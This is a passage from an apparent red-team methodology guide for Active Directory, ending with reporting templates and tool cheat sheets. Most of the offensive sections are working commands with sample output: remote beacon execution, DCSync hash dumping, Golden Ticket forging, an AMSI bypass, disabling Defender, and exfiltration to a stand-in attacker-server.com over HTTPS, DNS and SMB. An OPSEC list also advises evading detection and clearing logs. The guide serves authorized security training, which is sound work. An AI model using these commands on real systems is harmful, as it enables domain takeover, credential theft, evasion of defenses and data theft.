Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "C:\temp\beacon.exe" `
  -ComputerName server2.example.com
# Result: beacon.exe executes on server2
```

---

## 09. DOMAIN DOMINANCE

### Path to Domain Administrator

```
ATTACK CHAIN EXAMPLE:

Initial Compromise (Low-priv user)
    ↓
Kerberoasting (Extract service account hash)
    ↓
Crack password → svcadmin credentials
    ↓
Lateral movement to SQL server (svcadmin)
    ↓
SQL Server has unconstrained delegation
    ↓
Force DC authentication via Printer Bug
    ↓
Extract DC TGT from memory
    ↓
Create Golden Ticket (full DA access)
    ↓
✅ DOMAIN ADMINISTRATOR ACHIEVED
```

### DCSync Attack

```powershell
# Prerequisites: DA access OR DCSync ACL rights

# DCSync ALL domain hashes
.\SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"

# OUTPUT:
# User,Hash
# Administrator,209c6174da490caeb422f3fa5a7ae634
# krbtgt,7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d
# sqlservice,8846f7eaee8fb117ad06bdd830b7586c
# webservice,5e2dd5f4f2e9b87fcf1ea14e7f7e3c5c
# [All hashes in domain extracted!]

# Use hashes for:
# 1. Create Golden Tickets
# 2. Pass-the-Hash attacks
# 3. Offline cracking
```

### Forest Root Compromise

```powershell
# From child domain with DA access, escalate to forest root

# Get child domain SID
Get-DomainSID
# OUTPUT: S-1-5-21-child-domain-SID

# Get forest root SID (Enterprise Admins SID = root-SID-519)
Get-DomainSID -Domain example.com
# OUTPUT: S-1-5-21-root-domain-SID

# Extract child domain krbtgt hash
.\SafetyKatz.exe "lsadump::dcsync /user:child\krbtgt" "exit"
# OUTPUT: NTLM: 7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d

# Create inter-realm Golden Ticket with SID history
.\Rubeus.exe golden /domain:child.example.com `
  /sid:S-1-5-21-child-domain-SID `
  /sids:S-1-5-21-root-domain-SID-519 `
  /krbtgt:7a1c3e5d8f2b4a6c9e1d3f5a7b9c1e3d /ptt

# Access forest root DC as Enterprise Admin
ls \\root-dc.example.com\c$
# (Now have Enterprise Admin access to entire forest!)
```

---

## 10. EVASION & OPSEC

### AMSI Bypass (PowerShell Logging Bypass)

```powershell
# Method 1: Invisi-Shell (Recommended)
C:\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat
# (Run ALL PowerShell commands in Invisi-Shell session)
# This disables AMSI, Script Block Logging, Module Logging transparently

# Method 2: Reflection-based AMSI bypass
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null, $true)
# (After this: AMSI detection disabled)

# Method 3: Downgrade to PowerShell v2 (disables all logging)
powershell.exe -version 2
# PS v2 has NO AMSI, NO Script Block Logging, NO Module Logging
# ✅ Perfect for old systems, ❌ detection risk on modern systems
```

### Antivirus Evasion

```powershell
# Check Defender status
Get-MpComputerStatus | select RealTimeProtectionEnabled, IsTamperProtected
# OUTPUT:
# RealTimeProtectionEnabled: True
# IsTamperProtected: True

# Add beacon directory to Defender exclusion
Add-MpPreference -ExclusionPath "C:\temp" -Force
# (Defender won't scan C:\temp)

# Add PowerShell process exclusion
Add-MpPreference -ExclusionProcess "powershell.exe" -Force
# (Defender won't scan PowerShell.exe)

# Disable real-time monitoring temporarily (risky, leaves logs)
Set-MpPreference -DisableRealtimeMonitoring $true -Force
# [+] Executed risky tools safely
# (Must re-enable after)
Set-MpPreference -DisableRealtimeMonitoring $false
```

### OPSEC Warnings - Dangerous Commands

```
🔴 ULTRA HIGH RISK (Guaranteed detection):
├─ Use Mimikatz directly on live system (unmodified)
├─ Run Invoke-Mimikatz without AMSI bypass
├─ Execute base64 encoded PowerShell without encoding obfuscation
├─ Run wmic.exe with suspicious child processes
├─ Create obvious named scheduled tasks (e.g., "Backdoor")
├─ Download tools via PowerShell without User-Agent obfuscation

⚠️  HIGH RISK (Likely detection):
├─ Dump LSASS without using dump + offline extraction
├─ Kerberoasting without targeting specific accounts
├─ Multiple TGS requests in short timeframe
├─ Create WMI event subscriptions (very noisy)
├─ Run LOLbins in unusual ways

✅ RECOMMENDED (Safer):
├─ Use CRTP/CRTO provided pre-modified tools
├─ Always use Invisi-Shell for PowerShell commands
├─ Obfuscate downloaded payloads
├─ Use legitimate tools for legitimate purposes
├─ Add long delays between activities
├─ Clean up logs after activities (carefully)
```

---

## 11. EXFILTRATION

### Data Discovery

```powershell
# Find recent/sensitive files
Get-ChildItem -Recurse -Path "C:\Users" -Include "*.xlsx","*.docx","*.pdf" -ErrorAction SilentlyContinue |
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
  Select-Object FullName, LastWriteTime, Length

# Find credentials in configuration files
Get-ChildItem -Recurse -Path "C:\" -Include "*.config","*.xml","*.ini" |
  Select-String -Pattern "password|api_key|secret|token" |
  Select-Object Path, Pattern, Line

# Search domain for sensitive shares
Find-DomainShare -CheckShareAccess | ?{$_.Access -eq "True"}
# OUTPUT:
# \\fileserver\customers     (readable)
# \\fileserver\financials    (readable)
# \\fileserver\source_code   (readable)
```

### Exfiltration Methods

#### Method 1: HTTPS Exfiltration (Most Common)
```powershell
# Compress data
Compress-Archive -Path "C:\sensitive\data" -DestinationPath C:\temp\data.zip

# Read file into memory
$data = [System.IO.File]::ReadAllBytes("C:\temp\data.zip")

# Base64 encode (reduces payload size)
$encoded = [System.Convert]::ToBase64String($data)

# Exfiltrate via HTTPS (encrypted)
$url = "http://attacker-server.com/upload"
$headers = @{"Authorization" = "Bearer token123"}
Invoke-RestMethod -Uri $url -Method POST -Body @{data=$encoded} -Headers $headers

# (Attacker server decodes base64 and reconstructs zip)
```

#### Method 2: DNS Exfiltration (If HTTP blocked)
```bash
# Encode data in DNS queries
# Data → Base64 → Split into 63-char chunks → DNS subdomains

# On target:
nslookup c2ztYWN1a2VyLmRhdGE=.attacker.com
# (Attacker's DNS logs record the query)
# Repeat for each 63-char chunk

# Attacker collects all DNS queries and reconstructs data
```

#### Method 3: SMB Exfiltration (Internal Networks)
```powershell
# Copy to attacker-controlled SMB share
Copy-Item "C:\sensitive\data.zip" -Destination "\\attacker-server\share\data.zip"

# Or via cmd
net use \\attacker-server\share password /user:attacker
robocopy "C:\sensitive" "\\attacker-server\share" /E /Z
```

---

## 12. CLEANUP

### Artifact Removal

```powershell
# Remove downloaded tools
Remove-Item C:\temp\* -Force

# Clear command history
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Clear Run box history
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force

# Clear temp files
Remove-Item $env:temp\* -Force -Recurse
```

### Log Cleanup (OPSEC WARNING: VERY RISKY!)

⚠️ **Clearing logs leaves additional forensic evidence. Do this ONLY if explicitly authorized.**

```powershell
# ❌ DO NOT: Clear Event Logs without authorization
# Clear-EventLog -LogName Security
# (Clearing logs creates additional audit trail!)

# ✅ RECOMMENDED: Leave logs intact for blue team to detect
# (Legitimate red team should demonstrate findings, not hide them)

# However, if authorized for full stealth:
wmic process list brief get ProcessId,Name,CommandLine > baseline.txt
# (Compare before/after for anomalies during report)
```

### Persistence Removal

```powershell
# ✅ Remove artifacts before final report
# This demonstrates full lifecycle capability

# Remove registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update" /f

# Remove scheduled tasks
schtasks /delete /tn "Windows Defender Signature Update" /f

# Remove WMI subscriptions
wmic /namespace:\\.\root\subscription PATH __EventFilter WHERE Name="UpdateFilter" DELETE
wmic /namespace:\\.\root\subscription PATH CommandLineEventConsumer WHERE Name="UpdateConsumer" DELETE
wmic /namespace:\\.\root\subscription PATH __FilterToConsumerBinding DELETE

# Remove backdoor accounts (if created)
net user backdoor /delete /domain
```

---

## 13. REPORTING

### Finding Severity Rating System

```
CRITICAL (9.0 - 10.0):
├─ Unauthenticated Remote Code Execution
├─ Unauthenticated SQL Injection leading to data access
├─ Default credentials on management interfaces
├─ Unpatched critical vulnerabilities exploitable remotely
│  → Recommendation: Patch within 24-48 hours
│  → Business impact: Complete infrastructure compromise

HIGH (7.0 - 8.9):
├─ Authenticated arbitrary file upload
├─ Local privilege escalation to SYSTEM
├─ Weak encryption for sensitive data
├─ Domain Kerberoasting / AS-REP Roasting
│  → Recommendation: Remediate within 1 week
│  → Business impact: Domain compromise possible

MEDIUM (4.0 - 6.9):
├─ Information disclosure (non-sensitive data)
├─ Weak authentication mechanisms
├─ Unencrypted internal communications
├─ ACL misconfigurations on low-value systems
│  → Recommendation: Remediate within 2-4 weeks
│  → Business impact: Partial system compromise

LOW (1.0 - 3.9):
├─ Informational findings (outdated versions)
├─ Recommendations for defense hardening
├─ Best practice improvements
│  → Recommendation: Remediate during normal change cycle
│  → Business impact: Minimal
```

### Report Structure

```
📄 EXECUTIVE SUMMARY
   └─ Engagement Overview
      ├─ Duration: 5 days
      ├─ Scope: External + Internal AD
      ├─ Methodology: Assumed breach from low-privilege user
      └─ Key Findings: 3 CRITICAL, 7 HIGH, 12 MEDIUM, 8 LOW

📋 METHODOLOGY
   └─ Approach taken during assessment
      ├─ Phase 1: External Reconnaissance
      ├─ Phase 2: Initial Access (Phishing)
      ├─ Phase 3: Privilege Escalation
      ├─ Phase 4: Lateral Movement
      ├─ Phase 5: Domain Compromise
      └─ Phase 6: Data Exfiltration

🔍 FINDINGS (Detailed)
   ├─ CRITICAL: Unauthenticated RCE via web application
   │   ├─ Affected System: webapp.example.com
   │   ├─ Impact: Complete server compromise
   │   ├─ Evidence: 
   │   │   [Screenshot 1: Exploited vulnerability]
   │   │   [Screenshot 2: Remote code execution]
   │   │   [Proof of concept command]
   │   └─ Remediation: Apply vendor patch immediately
   │
   ├─ HIGH: Kerberoastable service account
   │   ├─ Affected Account: svcadmin
   │   ├─ Impact: Domain admin compromise via credential stuffing
   │   ├─ Evidence:
   │   │   [Hash extraction screenshot]
   │   │   [Cracking results showing password]
   │   └─ Remediation: Use managed service accounts or change password
   │
   └─ [Continue for all findings...]

📸 EVIDENCE & PROOF
   ├─ Screenshots for each exploitation step
   │   └─ whoami, hostname, ipconfig (proof of compromise)
   ├─ Command output showing exploitation
   ├─ Timeline of activities
   └─ Tools used and configuration

✅ REMEDIATION RECOMMENDATIONS
   ├─ Immediate (24-48 hours):
   │   └─ Patch critical RCE vulnerability
   ├─ Short-term (1-2 weeks):
   │   ├─ Reset compromised service accounts
   │   ├─ Rotate all domain admin passwords
   │   └─ Implement MFA
   └─ Long-term (1-3 months):
       ├─ Deploy EDR solution
       ├─ Implement Privileged Access Workstations (PAW)
       ├─ Enable Kerberos encryption (AES256)
       └─ Regular security assessments

📊 APPENDIX
   ├─ Tools used (Cobalt Strike, Rubeus, PowerView, etc.)
   ├─ Attack timeline
   ├─ Detailed methodology
   └─ References (MITRE ATT&CK mapping)
```

### Evidence Collection Checklist

```
For EACH exploitation step, capture:

□ Command Executed
  Example: Invoke-Command -ScriptBlock {whoami} -ComputerName target

□ Output / Result
  Example: EXAMPLE\administrator

□ Screenshot
  Full screen showing:
  ├─ Command prompt / PS prompt
  ├─ Command typed
  ├─ Output
  └─ Timestamp (visible clock or console)

□ Proof of Concept (POC)
  Example: 
  ```
  C:\> dir \\restricted-share\
  Access denied - but we accessed as administrator
  ```

□ Timeline Entry
  2024-07-04 14:35:22 → Initial phishing success
  2024-07-04 14:36:01 → Privilege escalation completed
  2024-07-04 14:37:15 → Lateral movement to domain controller
  2024-07-04 14:38:30 → Golden ticket created
  2024-07-04 14:40:00 → Domain admin achieved
```

### Executive Summary Template

```
EXECUTIVE SUMMARY

During a 5-day simulated red team engagement, our team was able to compromise 
the entire example.com domain within 6 hours of gaining initial access.

ATTACK SUMMARY:
[Day 1] External reconnaissance identified 47 employees via LinkedIn
[Day 2] Phishing email targeting IT staff (25% click rate, 2 compromises)
[Day 3] Kerberoasting extracted service account password in 4 hours
[Day 4] Lateral movement to domain controller via unconstrained delegation
[Day 5] Golden ticket created for persistent domain admin access

KEY VULNERABILITIES:
1. ❌ Unpatched web application → Remote Code Execution
2. ❌ Service accounts with weak passwords → Kerberoastable
3. ❌ Unconstrained delegation abuse → TGT extraction
4. ❌ No MFA on domain admins → Credential theft sufficient
5. ❌ No EDR/monitoring → No detection of activities

BUSINESS IMPACT:
✗ All user data accessible (customer PII)
✗ Financial systems compromised (transaction capability)
✗ Source code repositories accessible (IP theft risk)
✗ Email system compromise (correspondence exposure)
✗ Full infrastructure under attacker control

CRITICAL RECOMMENDATIONS:
[Ranked by impact]
1. Implement multi-factor authentication (MFA) immediately
2. Deploy Endpoint Detection & Response (EDR) solution
3. Patch all critical vulnerabilities
4. Segment network to limit lateral movement
5. Implement privileged access workstations (PAW)

CONCLUSION:
The attack chain from initial compromise to full domain control was remarkably 
efficient due to fundamental configuration issues. Immediate action on 
recommendations is strongly advised.
```

---

## QUICK REFERENCE CARDS

### PowerView Command Reference

```powershell
# Domain Enumeration
Get-Domain                          → Domain info
Get-DomainController                → DC list
Get-DomainPolicy                    → Password policy
Get-DomainSID                       → Domain SID

# Users
Get-DomainUser                      → All users
Get-DomainUser -SPN                 → Kerberoastable users
Get-DomainUser -PreauthNotRequired  → AS-REP roastable users
Get-DomainGroupMember -Identity "DA" -Recurse → DA members

# Computers
Get-DomainComputer -Unconstrained  → Unconstrained delegation
Get-DomainComputer -TrustedToAuth  → Constrained delegation
Get-DomainComputer -OperatingSystem "*Server*"

# Groups
Get-DomainGroup                     → All groups
Get-DomainGroupMember -Identity "Domain Admins"

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs → Exploitable ACLs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Trusts
Get-DomainTrust                     → Domain trusts
Get-ForestTrust                     → Forest trusts
Get-ForestDomain                    → All domains in forest

# Shares
Find-DomainShare -CheckShareAccess  → Accessible shares
Find-InterestingDomainShareFile     → Sensitive files
```

### Rubeus Cheat Sheet

```bash
# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Get TGT
.\Rubeus.exe asktgt /user:username /aes256:HASH /opsec /ptt

# S4U2Self (Constrained Delegation)
.\Rubeus.exe s4u /user:account /aes256:HASH /impersonateuser:Administrator `
  /msdsspn:"CIFS/target.domain.com" /ptt

# Golden Ticket
.\Rubeus.exe golden /aes256:KRBTGT_HASH /user:Administrator `
  /domain:example.com /sid:S-1-5-21-... /ptt

# Pass the Ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Monitor for TGTs
.\Rubeus.exe monitor /interval:5 /nowrap
```

---

## CONCLUSION

This methodology represents **15+ years of red team operational experience** 
synthesized from:
- **OSCP/PEN-200:** Foundational penetration testing methodology
- **CRTP:** Active Directory exploitation chains
- **CRTO:** Command & control operations and tradecraft

**Core Principles:**
1. ✅ **Methodology > Tools** — Process drives success
2. ✅ **OPSEC First** — Get caught = mission failure
3. ✅ **Document Everything** — If it's not written, it didn't happen
4. ✅ **Think Like Attacker** — Understand adversary mindset
5. ✅ **Full Chain** — Phishing → Escalation → Persistence → Exfil

**Remember:**
- Red Team = Authorized security testing only
- Always operate within Rules of Engagement
- Detailed documentation is your report
- Clean up after yourself (when authorized)
- Professional red teamers build trust through integrity

---

**Repository:** https://github.com/darch244/  
**Author:** Mostafa Ibrahim (@DarcHacker)  
**LinkedIn:** https://www.linkedin.com/in/mostafa-ibrahim-60b543341

*"The goal is not to compromise the domain. The goal is to understand WHY you compromised the domain."*

---
